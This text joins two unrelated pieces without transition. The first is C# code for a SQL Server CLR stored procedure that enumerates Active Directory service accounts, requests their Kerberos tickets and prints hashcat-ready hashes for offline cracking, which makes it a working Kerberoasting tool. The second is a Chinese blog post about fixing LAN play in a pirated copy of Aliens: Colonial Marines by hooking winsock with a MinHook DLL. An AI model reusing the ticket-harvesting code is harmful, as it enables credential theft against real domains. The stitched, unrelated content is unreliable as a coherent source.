using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using System.Diagnostics; using System.Text; using System.IO; using System.Security.Principal; using Microsoft.SqlServer.Server; using System.Text.RegularExpressions; using System.DirectoryServices; using System.DirectoryServices.AccountManagement; public partial class StoredProcedures {     [Microsoft.SqlServer.Server.SqlProcedure]     public static void ExecCommand (string cmd)     {         DirectoryEntry directoryObject = null;         DirectorySearcher userSearcher = null;         System.Net.NetworkCredential cred = null;         directoryObject = new DirectoryEntry();         userSearcher = new DirectorySearcher(directoryObject);         userSearcher.Filter =  "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))" ;         SearchResultCollection users = userSearcher.FindAll();                      foreach (SearchResult user  in  users)         {             string samAccountName = user.Properties[ "samAccountName" ][0].ToString();             string distinguishedName = user.Properties[ "distinguishedName" ][0].ToString();             string spn = user.Properties[ "servicePrincipalName" ][0].ToString();             SqlContext.Pipe.Send(string.Format( "SamAccountName         : {0}" , samAccountName));             SqlContext.Pipe.Send(string.Format( "DistinguishedName      : {0}" , distinguishedName));             SqlContext.Pipe.Send(string.Format( "ServicePrincipalName   : {0}" , spn));             string domain =  "test.local" ;             string userName= "test" ;             System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());             try             {                 byte[] requestBytes = ticket.GetRequest();                 string ticketHexStream = BitConverter.ToString(requestBytes).Replace( "-" ,  "" );                 // janky regex to try to find the part of the service ticket we want                 Match match = Regex.Match(ticketHexStream, @ "a382....3082....A0030201(? ..)A1.{1,4}.......A282(? ....)........(? .+)" , RegexOptions.IgnoreCase);                  if  (match.Success)                 {                     // usually 23                     byte eType = Convert.ToByte(match.Groups[ "EtypeLen" ].ToString(), 16);                     int cipherTextLen = Convert.ToInt32(match.Groups[ "CipherTextLen" ].ToString(), 16) - 4;                     string dataToEnd = match.Groups[ "DataToEnd" ].ToString();                     string cipherText = dataToEnd.Substring(0, cipherTextLen * 2);                      if  (match.Groups[ "DataToEnd" ].ToString().Substring(cipherTextLen * 2, 4) !=  "A482" )                     {                         SqlContext.Pipe.Send(string.Format( " [X] Error parsing ciphertext for the SPN {0}. Use the TicketByteHexStream to extract the hash offline with Get-KerberoastHashFromAPReq.
" , spn));                         bool header =  false ;                         foreach (string line  in  Split(ticketHexStream, 80))                         {                              if  (!header)                             {                                 SqlContext.Pipe.Send(string.Format( "TicketHexStream        : {0}" , line));                             }                              else                             {                                 SqlContext.Pipe.Send(string.Format( "                         {0}" , line));                             }                             header =  true ;                         }                     }                      else                     {                         // output to hashcat format                         string  hash  = String.Format( " $krb5tgs ${0} $*{1} ${2} ${3} * ${4} ${5} " , eType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));                         bool header =  false ;                         foreach (string line  in  Split( hash , 80))                         {                              if  (!header)                             {                                 SqlContext.Pipe.Send(string.Format( "Hash                   : {0}" , line));                             }                              else                             {                                 SqlContext.Pipe.Send(string.Format( "                         {0}" , line));                             }                             header =  true ;                         }                     }                 }             }             catch (Exception ex)             {                 SqlContext.Pipe.Send(string.Format( "
 [X] Error during request for SPN {0} : {1}
" , spn, ex.InnerException.Message));             }         }     }     public static System.Collections.Generic.IEnumerable  Split(string text, int partLength)         {              if  (text == null) { throw new ArgumentNullException( "singleLineString" ); }              if  (partLength < 1) { throw new ArgumentException( "'columns' must be greater than 0." ); }             double partCount = Math.Ceiling((double)text.Length / partLength);              if  (partCount < 2)             {                 yield  return  text;             }              for  (int i = 0; i < partCount; i++)             {                 int index = i * partLength;                 int lengthLeft = Math.Min(partLength, text.Length - index);                 string line = text.Substring(index, lengthLeft);                 yield  return  line;             }         } }

3995702235.body:
原创 huoji 2026-05-28 08:00 北京 
前言 
这几天在跟朋友玩《异形:殖民军》这款游戏，这款游戏于2013年发售，制作完后制作组就跑路了。可以简单理解为这是一款太空版支持联机过剧情的使命召唤like游戏。我们两个下的都是FLT修改版本，本来想以前走hamachi局域网联机。 但是意外发生了，我们死活联机不上。提示找不到游戏。随后我们试了一下tun方案/对战平台方案，完全没办法联机。 
可是我记得十年前玩的时候是可以正常联机的。问题出在哪？ 
联机流程 
由于游戏早就死了，steam买不值得，我们用的是盗版，盗版走的是局域网联机方案，所谓局域网联机方案，一般指的是用hamachi或者对战平台或者各种联机工具 建立一个虚拟局域网，大家都有一样的虚拟局域网ip 
这个虚拟机的网卡就是假的局域网，从而让大家走“局域网联机” 
理论上我们应该连的上，所以对这个网卡进行抓包，发现完全没游戏的数据包进来（游戏数据包是UPD，这里只有ICMP,是测延迟用的） 
传统游戏的局域网联机逻辑是，游戏对所有网卡的0.0.0.0 发一个UDP广播包，255.255.255.255 这个包会在整个局域网进行广播，然后如果有客户端就会 回包。 这个游戏确实监听了UDP端口，并且等待广播包 
所以 问题很明显，游戏并没有对这个网卡发包。打开procmon，我们看看游戏发了什么包: 
我们可以看到，这个是第一个问题，这个游戏广播的包是我的物理网卡地址，并不是TUN的卡的地址。那肯定是没有人回复的。 这个问题很好解决，根据我多年的 零信任开发经验 ，游戏应该是通过一个叫做 越点 的机制去判断当前可用网卡的，我们只需要把虚拟网卡的越点设置为1就行 
这样游戏就会优先考虑虚拟网卡的IP发包。 但是依然连不上 再次抓包，发现： 
解读一下，游戏的广播包服务端确实返回了回复了，我的客户端也即将链接，但是我的客户端莫名其妙的链到了25.16.24.136这个完全摸不着头脑的国外地址！ 按理说应该直接链接10.100.239.2这个我的朋友的虚拟网卡IP的 
经过一段时间的摸索，我发现，这个25.16.245.136是我朋友的一个虚拟网卡的IP地址，说明： 游戏服务端收到信息了，但是回复的网卡IP错误！理论上， 应该回复他的当前包过来的绑定的IP 但是为什么会回复这个，不知道。 
临时解决方法是，禁用这个虚拟网卡，祈祷游戏能找到真的地址 禁用虚拟网卡后，我们发现更完蛋了，游戏服务端返回的是电脑的物理网卡地址   
这个是不可能通的，除非开零信任。零信任这个时候确实派上用场了。但是肯定不能为了一个游戏装这玩意。 因此有必要去代码层看看了 
深入代码层 
让我们直接逆向这个游戏，看看为什么会这样吧拖入IDA，对sento打断点，连接游戏看看： 
构造255.255.255.255的包 
发送: 
可以看到，发送的socket是一个socket，而不是枚举网卡逐个发送 
这就导致了第一个问题，广播包没广播对网卡 
对于第二个问题，我们抓一个包看看： 游戏服务器会返回一个包里面带了游戏服务端的IP地址 这一段是服务端的IP地址： 这个IP地址很明显也是错误的 根据服务端代码，问题出在得到网卡地址的这里，服务端收到包是能知道哪个socket的，但是他的网络和引擎层不是一个socket，他的网络层是获取不到的，所以他就只能，取一个本机 IP 发出去….毕竟，2013年的时候哪有那么复杂的网卡局域网联机环境？ 而这个IP就是纯随机的来源。 
修复这个bug 
我们有几个修复方案，比如改包把IP改成自己的，起一个假的转发代理服务器等。但是最直接的办法是hook，我跟朋友写了两个方案，我的方案是客户端的方案，朋友的是服务端方案 
客户端方案： 通过hook sockets,进行改包,我用的是minihook: 
#include  "pch.h" 
#include  <cstdio> 
#include  <cstdarg> 
#include  <cstdint> 
#include  <cstring> 
#include  <vector> 
#include  <string> 
#include  "MinHook/include/MinHook.h" 
namespace { 
using sendto_t = int(WINAPI*)(SOCKET, const char*, int, int, const sockaddr*, 
int); 
using recvfrom_t = int(WINAPI*)(SOCKET, char*, int, int, sockaddr*, int*); 
using bind_t = int(WINAPI*)(SOCKET, const sockaddr*, int); 
using getsockname_t = int(WINAPI*)(SOCKET, sockaddr*, int*); 
using gethostname_t = int(WINAPI*)(char*, int); 
using gethostbyname_t = hostent*(WINAPI*)(const char*); 
sendto_t RealSendTo = nullptr; 
recvfrom_t RealRecvFrom = nullptr; 
bind_t RealBind = nullptr; 
getsockname_t RealGetSockName = nullptr; 
gethostname_t RealGetHostName = nullptr; 
gethostbyname_t RealGetHostByName = nullptr; 
HMODULE g_Module = nullptr; 
HANDLE g_WorkerThread = nullptr; 
volatile bool g_Running = true; 
bool g_LogPackets = true; 
bool g_FixPayload = false; 
uint32_t g_ForcedIp = 0; 
std::vector<uint32_t> g_LocalIps; 
CRITICAL_SECTION g_LogLock; 
uint32_t ReadBe32(const char* p) { 
return (uint32_t(uint8_t(p[0])) << 24) | (uint32_t(uint8_t(p[1])) << 16) | 
(uint32_t(uint8_t(p[2])) << 8) | uint32_t(uint8_t(p[3])); 
} 
void WriteBe32(char* p, uint32_t ip) { 
p[0] = char((ip >> 24) & 0xff); 
p[1] = char((ip >> 16) & 0xff); 
p[2] = char((ip >> 8) & 0xff); 
p[3] = char(ip & 0xff); 
} 
std::string IpToString(uint32_t ip) { 
char buf[32]; 
std::snprintf(buf, sizeof(buf), "%u.%u.%u.%u", (ip >> 24) & 0xff, 
(ip >> 16) & 0xff, (ip >> 8) & 0xff, ip & 0xff); 
return buf; 
} 
uint32_t SockAddrIp(const sockaddr* addr) { 
if (!addr || addr->sa_family != AF_INET) { 
return 0; 
} 
const sockaddr_in* in = reinterpret_cast<const sockaddr_in*>(addr); 
return ntohl(in->sin_addr.s_addr); 
} 
uint16_t SockAddrPort(const sockaddr* addr) { 
if (!addr || addr->sa_family != AF_INET) { 
return 0; 
} 
const sockaddr_in* in = reinterpret_cast<const sockaddr_in*>(addr); 
return ntohs(in->sin_port); 
} 
void Log(const char* fmt, ...) { 
EnterCriticalSection(&g_LogLock); 
va_list args; 
va_start(args, fmt); 
std::vprintf(fmt, args); 
va_end(args); 
std::printf("\n"); 
std::fflush(stdout); 
LeaveCriticalSection(&g_LogLock); 
} 
bool IsInterestingPacket(const char* buf, int len) { 
if (!buf || len <= 0) { 
return false; 
} 
if (len >= 2 && buf[0] == 'U' && 
(buf[1] == 'D' || buf[1] == 'C' || buf[1] == 'F')) { 
return true; 
} 
if (len >= 2 && buf[0] == 'N' && buf[1] == 'F') { 
return true; 
} 
if (len > 200) { 
return true; 
} 
return false; 
} 
bool LooksLikeUsefulIp(uint32_t ip) { 
const uint8_t a = uint8_t((ip >> 24) & 0xff); 
const uint8_t b = uint8_t((ip >> 16) & 0xff); 
if (ip == 0 || ip == 0xffffffff || a == 0 || a == 127 || a >= 224) { 
return false; 
} 
if (a == 10 || a == 25 || (a == 172 && b >= 16 && b <= 31) || 
(a == 192 && b == 168)) { 
return true; 
} 
return false; 
} 
void ScanPayloadIps(const char* tag, const char* buf, int len) { 
if (!buf || len < 4) { 
return; 
} 
int shown = 0; 
for (int i = 0; i <= len - 4; ++i) { 
const uint32_t be = ReadBe32(buf + i); 
if (LooksLikeUsefulIp(be)) { 
if (shown == 0) { 
std::printf("%s candidate IPs:", tag); 
} 
std::printf(" +0x%X=%s", i, IpToString(be).c_str()); 
++shown; 
if (shown >= 12) { 
std::printf(" ..."); 
break; 
} 
} 
} 
if (shown > 0) { 
std::printf("\n"); 
} 
} 
void DumpPacketPrefix(const char* tag, const char* buf, int len) { 
if (!buf || len <= 0) { 
return; 
} 
const int count = len < 64 ? len : 64; 
std::printf("%s first %d:", tag, count); 
for (int i = 0; i < count; ++i) { 
std::printf(" %02X", uint8_t(buf[i])); 
} 
std::printf("\n"); 
} 
void AddLocalIp(uint32_t ip) { 
if (ip == 0 || ip == 0x7f000001) { 
return; 
} 
for (uint32_t existing : g_LocalIps) { 
if (existing == ip) { 
return; 
} 
} 
g_LocalIps.push_back(ip); 
} 
void RefreshLocalIps() { 
g_LocalIps.clear(); 
HMODULE wsock32 = GetModuleHandleW(L"WSOCK32.dll"); 
if (!wsock32) { 
wsock32 = LoadLibraryW(L"WSOCK32.dll"); 
} 
auto realGetHostName = 
reinterpret_cast<gethostname_t>(GetProcAddress(wsock32, "gethostname")); 
auto realGetHostByName = reinterpret_cast<gethostbyname_t>( 
GetProcAddress(wsock32, "gethostbyname")); 
char name[256] = {}; 
if (realGetHostName && realGetHostByName && 
realGetHostName(name, sizeof(name)) == 0) { 
hostent* host = realGetHostByName(name); 
if (host && host->h_addrtype == AF_INET) { 
for (char** addr = host->h_addr_list; addr && *addr; ++addr) { 
AddLocalIp(ntohl(*reinterpret_cast<uint32_t*>(*addr))); 
} 
} 
} 
} 
int ReplaceIpsInPayload(char* buf, int len, uint32_t replacement) { 
if (!buf || len < 4 || replacement == 0) { 
return 0; 
} 
int replaced = 0; 
for (int i = 0; i <= len - 4; ++i) { 
const uint32_t value = ReadBe32(buf + i); 
for (uint32_t localIp : g_LocalIps) { 
if (value == localIp && value != replacement) { 
WriteBe32(buf + i, replacement); 
++replaced; 
} 
} 
} 
return replaced; 
} 
int WINAPI HookSendTo(SOCKET s, const char* buf, int len, int flags, 
const sockaddr* to, int tolen) { 
const uint32_t toIp = SockAddrIp(to); 
const uint16_t toPort = SockAddrPort(to); 
if (g_LogPackets && IsInterestingPacket(buf, len)) { 
Log("sendto s=%p to=%s:%u len=%d", reinterpret_cast<void*>(s), 
IpToString(toIp).c_str(), toPort, len); 
DumpPacketPrefix("  send", buf, len); 
ScanPayloadIps("  send", buf, len); 
} 
if (g_FixPayload && g_ForcedIp && buf && len > 0) { 
std::vector<char> copy(buf, buf + len); 
const int changed = ReplaceIpsInPayload(copy.data(), len, g_ForcedIp); 
if (changed > 0) { 
Log("sendto fixed %d payload IP(s) -> %s", changed, 
IpToString(g_ForcedIp).c_str()); 
return RealSendTo(s, copy.data(), len, flags, to, tolen); 
} 
} 
return RealSendTo(s, buf, len, flags, to, tolen); 
} 
int WINAPI HookRecvFrom(SOCKET s, char* buf, int len, int flags, sockaddr* from, 
int* fromlen) { 
const int ret = RealRecvFrom(s, buf, len, flags, from, fromlen); 
if (ret <= 0) { 
return ret; 
} 
const uint32_t fromIp = SockAddrIp(from); 
const uint16_t fromPort = SockAddrPort(from); 
if (g_FixPayload && fromIp) { 
const int changed = ReplaceIpsInPayload(buf, ret, fromIp); 
if (changed > 0) { 
Log("recvfrom fixed %d payload IP(s) -> packet source %s", changed, 
IpToString(fromIp).c_str()); 
} 
} 
if (g_LogPackets && IsInterestingPacket(buf, ret)) { 
Log("recvfrom s=%p from=%s:%u len=%d", reinterpret_cast<void*>(s), 
IpToString(fromIp).c_str(), fromPort, ret); 
DumpPacketPrefix("  recv", buf, ret); 
ScanPayloadIps("  recv", buf, ret); 
} 
return ret; 
} 
int WINAPI HookBind(SOCKET s, const sockaddr* name, int namelen) { 
const uint32_t ip = SockAddrIp(name); 
AddLocalIp(ip); 
Log("bind s=%p local=%s:%u", reinterpret_cast<void*>(s), 
IpToString(ip).c_str(), SockAddrPort(name)); 
return RealBind(s, name, namelen); 
} 
int WINAPI HookGetSockName(SOCKET s, sockaddr* name, int* namelen) { 
const int ret = RealGetSockName(s, name, namelen); 
if (ret == 0) { 
const uint32_t ip = SockAddrIp(name); 
AddLocalIp(ip); 
Log("getsockname s=%p local=%s:%u", reinterpret_cast<void*>(s), 
IpToString(ip).c_str(), SockAddrPort(name)); 
} 
return ret; 
} 
int WINAPI HookGetHostName(char* name, int namelen) { 
const int ret = RealGetHostName(name, namelen); 
if (ret == 0) { 
Log("gethostname -> %s", name); 
} 
return ret; 
} 
hostent* WINAPI HookGetHostByName(const char* name) { 
hostent* ret = RealGetHostByName(name); 
if (ret) { 
std::printf("gethostbyname %s ->", name ? name : "<null>"); 
if (ret->h_addrtype == AF_INET) { 
for (char** addr = ret->h_addr_list; addr && *addr; ++addr) { 
const uint32_t ip = ntohl(*reinterpret_cast<uint32_t*>(*addr)); 
AddLocalIp(ip); 
std::printf(" %s", IpToString(ip).c_str()); 
} 
} 
std::printf("\n"); 
} 
return ret; 
} 
bool HookExport(HMODULE module, const char* name, void* hook, void** original) { 
void* target = reinterpret_cast<void*>(GetProcAddress(module, name)); 
if (!target) { 
Log("missing export: %s", name); 
return false; 
} 
MH_STATUS status = MH_CreateHook(target, hook, original); 
if (status != MH_OK && status != MH_ERROR_ALREADY_CREATED) { 
Log("MH_CreateHook(%s) failed: %d", name, status); 
return false; 
} 
status = MH_EnableHook(target); 
if (status != MH_OK && status != MH_ERROR_ENABLED) { 
Log("MH_EnableHook(%s) failed: %d", name, status); 
return false; 
} 
Log("hooked %s at %p", name, target); 
return true; 
} 
uint32_t ParseIp(const char* text) { 
unsigned int a = 0, b = 0, c = 0, d = 0; 
if (sscanf_s(text, "%u.%u.%u.%u", &a, &b, &c, &d) != 4) { 
return 0; 
} 
if (a > 255 || b > 255 || c > 255 || d > 255) { 
return 0; 
} 
return (a << 24) | (b << 16) | (c << 8) | d; 
} 
void PrintHelp() { 
Log("commands:"); 
Log("  help             show commands"); 
Log("  log on|off       enable or disable packet logs"); 
Log("  fix on|off       replace payload local IPs, default off"); 
Log("  ip a.b.c.d       force replacement IP for outgoing sendto"); 
Log("  local a.b.c.d    add an IP that should be replaced"); 
Log("  ips              show local IPs detected by gethostbyname"); 
Log("  refresh          refresh local IP list"); 
Log("  quit             unhook and unload DLL"); 
} 
void CommandLoop() { 
PrintHelp(); 
char line[256] = {}; 
while (g_Running && std::fgets(line, sizeof(line), stdin)) { 
line[strcspn(line, "\r\n")] = 0; 
if (_stricmp(line, "help") == 0) { 
PrintHelp(); 
} else if (_stricmp(line, "log on") == 0) { 
g_LogPackets = true; 
Log("log on"); 
} else if (_stricmp(line, "log off") == 0) { 
g_LogPackets = false; 
Log("log off"); 
} else if (_stricmp(line, "fix on") == 0) { 
g_FixPayload = true; 
Log("fix on"); 
} else if (_stricmp(line, "fix off") == 0) { 
g_FixPayload = false; 
Log("fix off"); 
} else if (_strnicmp(line, "ip ", 3) == 0) { 
const uint32_t ip = ParseIp(line + 3); 
if (ip) { 
g_ForcedIp = ip; 
Log("forced IP = %s", IpToString(g_ForcedIp).c_str()); 
} else { 
Log("bad ip"); 
} 
} else if (_strnicmp(line, "local ", 6) == 0) { 
const uint32_t ip = ParseIp(line + 6); 
if (ip) { 
AddLocalIp(ip); 
Log("added local/replace source IP = %s", 
IpToString(ip).c_str()); 
} else { 
Log("bad ip"); 
} 
} else if (_stricmp(line, "ips") == 0) { 
for (uint32_t ip : g_LocalIps) { 
Log("local %s", IpToString(ip).c_str()); 
} 
} else if (_stricmp(line, "refresh") == 0) { 
RefreshLocalIps(); 
Log("refreshed %u local IP(s)", unsigned(g_LocalIps.size())); 
} else if (_stricmp(line, "quit") == 0) { 
g_Running = false; 
break; 
} else if (line[0]) { 
Log("unknown command: %s", line); 
} 
} 
} 
DWORD WINAPI WorkerThread(LPVOID) { 
AllocConsole(); 
FILE* file = nullptr; 
freopen_s(&file, "CONOUT$", "w", stdout); 
freopen_s(&file, "CONOUT$", "w", stderr); 
freopen_s(&file, "CONIN$", "r", stdin); 
SetConsoleTitleW(L"ACM LAN hook"); 
Log("ACM LAN hook loaded"); 
RefreshLocalIps(); 
Log("local IP count: %u", unsigned(g_LocalIps.size())); 
for (uint32_t ip : g_LocalIps) { 
Log("local %s", IpToString(ip).c_str()); 
} 
HMODULE wsock32 = GetModuleHandleW(L"WSOCK32.dll"); 
if (!wsock32) { 
wsock32 = LoadLibraryW(L"WSOCK32.dll"); 
} 
if (!wsock32) { 
Log("failed to load WSOCK32.dll"); 
CommandLoop(); 
} else if (MH_Initialize() == MH_OK) { 
HookExport(wsock32, "sendto", HookSendTo, 
reinterpret_cast<void**>(&RealSendTo)); 
HookExport(wsock32, "recvfrom", HookRecvFrom, 
reinterpret_cast<void**>(&RealRecvFrom)); 
HookExport(wsock32, "bind", HookBind, 
reinterpret_cast<void**>(&RealBind)); 
HookExport(wsock32, "getsockname", HookGetSockName, 
reinterpret_cast<void**>(&RealGetSockName)); 
HookExport(wsock32, "gethostname", HookGetHostName, 
reinterpret_cast<void**>(&RealGetHostName)); 
HookExport(wsock32, "gethostbyname", HookGetHostByName, 
reinterpret_cast<void**>(&RealGetHostByName)); 
CommandLoop(); 
MH_DisableHook(MH_ALL_HOOKS); 
MH_Uninitialize(); 
} else { 
Log("MH_Initialize failed"); 
CommandLoop(); 
} 
Log("unloading"); 
FreeConsole(); 
FreeLibraryAndExitThread(g_Module, 0); 
return 0; 
} 
}  // namespace 
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, 
LPVOID lpReserved) { 
switch (ul_reason_for_call) { 
case DLL_PROCESS_ATTACH: 
g_Module = hModule; 
DisableThreadLibraryCalls(hModule); 
InitializeCriticalSection(&g_LogLock); 
g_WorkerThread = 
CreateThread(nullptr, 0, WorkerThread, nullptr, 0, nullptr); 
break; 
case DLL_THREAD_ATTACH: 
case DLL_THREAD_DETACH: 
break; 
case DLL_PROCESS_DETACH: 
if (lpReserved == nullptr) { 
g_Running = false; 
} 
DeleteCriticalSection(&g_LogLock); 
break; 
} 
return TRUE; 
